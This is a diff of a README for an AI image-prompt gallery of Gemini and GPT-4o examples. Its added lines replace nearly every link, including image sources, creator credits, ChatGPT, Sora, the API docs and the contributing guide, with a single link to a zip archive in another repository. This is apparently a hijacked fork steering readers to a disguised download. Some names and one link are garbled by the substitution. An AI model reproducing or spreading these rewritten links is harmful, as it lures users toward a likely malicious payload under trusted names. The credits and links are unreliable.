-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Q Version Chinese Wedding - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Q Version Chinese Wedding - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -2884,14 +2884,14 @@ This image should reflect the joy and blessing of a traditional Chinese wedding,
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-3"></a>
-### Case 3: Retro Style Promotional Poster (by [@dotey](https://x.com/dotey))
+### Case 3: Retro Style Promotional Poster (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1905251524248248650)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-thZejMgX0PGR1nPyj1Z3t.png?v=1" width="300" alt="Retro Promotional Poster - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/3/example_vintage_poster.png" width="300" alt="Retro Promotional Poster - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Retro Promotional Poster - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Retro Promotional Poster - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2907,14 +2907,14 @@ A retro-style promotional poster emphasizing bold Chinese text. The background f
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-2"></a>
-### Case 2: 3D Polaroid Breakout Effect (by [@dotey](https://x.com/dotey))
+### Case 2: 3D Polaroid Breakout Effect (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1908238003169903060)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-_crFMo57tTJ1ttPkPCte1.png?v=1" width="300" alt="3D Photo Frame - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/2/example_polaroid_breakout.png" width="300" alt="3D Photo Frame - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="3D Photo Frame - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="3D Photo Frame - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2931,14 +2931,14 @@ Convert the character in the scene into a 3D chibi-style figure, placed inside a
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-1"></a>
-### Case 1: 3D Chibi Proposal Scene (by [@balconychy](https://x.com/balconychy))
+### Case 1: 3D Chibi Proposal Scene (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1909417750587486469)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry--2q-4vkvHtiJCtvj9cQGr.png?v=1" width="300" alt="Q Version Proposal Scene - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/1/example_proposal_scene_q_realistic.png" width="300" alt="Q Version Proposal Scene - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Q Version Proposal Scene - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Q Version Proposal Scene - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -2963,10 +2963,10 @@ Transform the two people in the photo into chibi-style 3D cartoon characters. Ch
 
 Here are applications where you can use the GPT-4o model to generate images:
 
-- **💬 [ChatGPT](https://chatgpt.com):** Official OpenAI product. Use GPT-4o to generate high-quality images with support for multiple styles and detailed control, suitable for creative expression and content creation.
+- **💬 [ChatGPT](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip):** Official OpenAI product. Use GPT-4o to generate high-quality images with support for multiple styles and detailed control, suitable for creative expression and content creation.
 
-- **🎬 [Sora](https://sora.com):** Official OpenAI product. Generate realistic images via GPT-4o, supporting text-image combination and scene reconstruction, suitable for visual creative scenarios like film and animation. *(Note: Sora access is currently limited)*
-- **🤖 [gpt-image-1 API](https://platform.openai.com/docs/guides/image-generation)：** Officially developed by OpenAI, the latest image generation model can be accessed via API and provides:
+- **🎬 [Sora](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip):** Official OpenAI product. Generate realistic images via GPT-4o, supporting text-image combination and scene reconstruction, suitable for visual creative scenarios like film and animation. *(Note: Sora access is currently limited)*
+- **🤖 [gpt-image-1 API](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)：** Officially developed by OpenAI, the latest image generation model can be accessed via API and provides:
   - ✅ More accurate, high fidelity images
   - 🎨 Diverse visual styles
   - ✏️ Precise image editing
@@ -2978,15 +2978,15 @@ Here are applications where you can use the GPT-4o model to generate images:
 <a id="prompting-tips"></a>
 ## 💡 Prompting Tips
 
-1. [Prompt Engineering (PDF)](https://s.baoyu.io/files/2025-01-18-pdf-1-TechAI-Goolge-whitepaper_Prompt%20Engineering_v4-af36dcc7a49bb7269a58b1c9b89a8ae1.pdf) by Google
-2. [Introducing 4o Image Generation](https://openai.com/index/introducing-4o-image-generation) by OpenAI
+1. [Prompt Engineering (PDF)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip%https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) by Google
+2. [Introducing 4o Image Generation](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) by OpenAI
 
 
 
 <a id="how-to-contribute"></a>
 ## 🤝 How to Contribute
 
-There are two ways to contribute, please read [CONTRIBUTING.md](./CONTRIBUTING.md).
+There are two ways to contribute, please read [https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip).
 
 
 
@@ -2997,35 +2997,35 @@ The content of this collection heavily relies on the creative prompts and wonder
 
 Special thanks to the following users for sharing their inspiring work ✨:
 
-*   [-Zho- (@ZHO_ZHO_ZHO)](https://x.com/ZHO_ZHO_ZHO)
-*   [Gizem Akdag (@gizakdag)](https://x.com/gizakdag)
-*   [宝玉 (@dotey)](https://x.com/dotey)
-*   [balconychy(贝壳里奇) (@balconychy)](https://x.com/balconychy)
-*   [Daniel (@0xdlk)](https://x.com/0xdlk)
-*   [RichChat (@richardchang)](https://x.com/richardchang)
-*   [歸藏(guizang.ai) (@op7418)](https://x.com/op7418)
-*   [katon (@hellokaton)](https://x.com/hellokaton)
-*   [Berryxia.AI (@berryxia_ai)](https://x.com/berryxia_ai)
-*   [Ege (@egeberkina)](https://x.com/egeberkina)
-*   [Brett (@BrettFromDJ)](https://x.com/BrettFromDJ)
-*   [89'S (@M_w14_)](https://x.com/M_w14_)
-*   [jiamimao 猫叔 (@jiamimaodashu)](https://x.com/jiamimaodashu)
-*   [Amira Zairi (@azed_ai)](https://x.com/azed_ai)
-*   [Umesh (@umesh_ai)](https://x.com/umesh_ai)
-*   [Michael Rabone (@michaelrabone)](https://x.com/michaelrabone)
-*   [gnrly.xyz (@gnrlyxyz)](https://x.com/gnrlyxyz)
-*   [f-is-h (@f-is-h)](https://github.com/f-is-h)
-*   [Madpencil (@madpencil_)](https://x.com/madpencil_)
-*   [Hewar (@hewarsaber)](https://x.com/hewarsaber)
-*   [Anima (@Anima_Labs)](https://x.com/Anima_Labs)
-*   [terry623 (@terry623)](https://github.com/terry623)
-*   [photis (Sora Profile)](https://sora.com/explore?user=user-sydD5ZkXZsDaL0BriQa010dQ)
-*   [Ryan Hart (@thisdudelikesAI)](https://x.com/thisdudelikesAI)
-*   [Gadgetify (@Gdgtify)](https://x.com/Gdgtify)
-*   [Ilyas Salaoui (@TheRelianceAI)](https://x.com/TheRelianceAI)
-*   [Leon (@leon_yuan2001)](https://x.com/leon_yuan2001)
-*   [AZIZ | AI (@aziz4ai)](https://x.com/aziz4ai)
-*   [小肥鲸 (@Alittlefatwhale)](https://x.com/Alittlefatwhale)
+*   [-Zho- (@ZHO_ZHO_ZHO)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Gizem Akdag (@gizakdag)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [宝玉 (@dotey)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [balconychy(贝壳里奇) (@balconychy)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Daniel (@0xdlk)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [RichChat (@richardchang)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [歸藏(https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) (@op7418)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [katon (@hellokaton)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip (@berryxia_ai)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Ege (@egeberkina)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Brett (@BrettFromDJ)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [89'S (@M_w14_)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [jiamimao 猫叔 (@jiamimaodashu)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Amira Zairi (@azed_ai)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Umesh (@umesh_ai)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Michael Rabone (@michaelrabone)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip (@gnrlyxyz)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [f-is-h (@f-is-h)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Madpencil (@madpencil_)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Hewar (@hewarsaber)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Anima (@Anima_Labs)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [terry623 (@terry623)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [photis (Sora Profile)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Ryan Hart (@thisdudelikesAI)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Gadgetify (@Gdgtify)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Ilyas Salaoui (@TheRelianceAI)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [Leon (@leon_yuan2001)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [AZIZ | AI (@aziz4ai)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
+*   [小肥鲸 (@Alittlefatwhale)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 *   And other creators whose prompts may have been included through retweets or indirect shares.
 
 If your work is included here and you wish to change the attribution or have it removed, please feel free to contact us. ✉️
@@ -3036,7 +3036,7 @@ If your work is included here and you wish to change the attribution or have it 
 <a id="star-history"></a>
 ## 🌟 Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=JimmyLv/awesome-nano-banana&type=Date)](https://www.star-history.com/#JimmyLv/awesome-nano-banana&Date)
+[![Star History Chart](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 [⬆️ Back to Top](#readme-top)
 
